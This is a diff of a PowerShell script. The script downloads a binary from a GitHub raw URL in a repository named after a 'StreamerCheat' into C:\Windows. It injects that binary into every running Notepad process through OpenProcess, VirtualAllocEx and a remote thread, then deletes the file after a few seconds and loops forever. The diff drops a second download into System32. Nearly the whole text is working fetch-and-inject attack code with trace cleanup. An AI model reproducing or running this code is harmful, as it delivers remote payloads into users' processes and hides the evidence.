@@ -3,15 +3,10 @@ $PROCESS_ALL_ACCESS = 0x1F0FFF
 $MEM_COMMIT = 0x1000
 $MEM_RESERVE = 0x2000
 $PAGE_READWRITE = 0x04
+$dllUrl = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"
+$dllPath = "C:\Windows\ShellJector.tlb"
 
-# DLLs
-$dll1Url = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/colorgui.dll.mun"         # 👈 You will provide this
-$dll1Path = "C:\Windows\System32\colorgui.dll.mun"
-
-$dll2Url = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"         # 👈 DLL for injection
-$dll2Path = "C:\Windows\ShellJector.tlb"
-
-# P/Invoke definitions
+# P/Invoke declarations
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -38,33 +33,24 @@ public class Win32 {
 }
 "@
 
-# Step 1: Download DLL1 (only once)
-try {
-    Invoke-WebRequest -Uri $dll1Url -OutFile $dll1Path -UseBasicParsing -ErrorAction Stop
-    Write-Host "✅ DLL1 downloaded at $dll1Path" -ForegroundColor Green
-} catch {
-    Write-Host "❌ Failed to download DLL1. Exiting." -ForegroundColor Red
-    exit 1
-}
-
-# Step 2: Start Notepad monitoring and inject DLL2
+# Continuous monitoring loop
 while ($true) {
-    # Wait for Notepad to run
+    # Wait until Notepad is running
     do {
         $notepad = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
         Start-Sleep -Seconds 1
     } while (-not $notepad)
 
-    # Download DLL2 (only when Notepad is running)
+    # Download DLL
     try {
-        Invoke-WebRequest -Uri $dll2Url -OutFile $dll2Path -UseBasicParsing -ErrorAction Stop
-        Write-Host "✅ DLL2 downloaded." -ForegroundColor Green
+        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
+        Write-Host "✅ DLL downloaded." -ForegroundColor Green
     } catch {
-        Write-Host "❌ Failed to download DLL2." -ForegroundColor Red
+        Write-Host "❌ Failed to download DLL." -ForegroundColor Red
         continue
     }
 
-    # Inject DLL2 into each running Notepad process
+    # Inject into each running Notepad process
     foreach ($proc in $notepad) {
         $processId = $proc.Id
         $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)
@@ -74,7 +60,7 @@ while ($true) {
             continue
         }
 
-        $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dll2Path + [char]0)
+        $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)
         $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
 
         if ($allocMem -eq [IntPtr]::Zero) {
@@ -104,14 +90,14 @@ while ($true) {
         if ($hThread -eq [IntPtr]::Zero) {
             Write-Host "❌ Thread creation failed for PID: $processId" -ForegroundColor Red
         } else {
-            Write-Host "✅ DLL2 injected into Notepad (PID: $processId)" -ForegroundColor Cyan
+            Write-Host "✅ DLL injected into Notepad (PID: $processId)" -ForegroundColor Cyan
         }
     }
 
-    # Wait a few seconds then delete DLL2
+    # Wait a few seconds then delete the DLL
     Start-Sleep -Seconds 5
-    Remove-Item $dll2Path -Force -ErrorAction SilentlyContinue
-    Write-Host "🧹 DLL2 deleted. Monitoring continues..." -ForegroundColor Yellow
+    Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
+    Write-Host "🧹 DLL deleted. Monitoring continues..." -ForegroundColor Yellow
 
     # Wait until all Notepad instances are closed
     do {
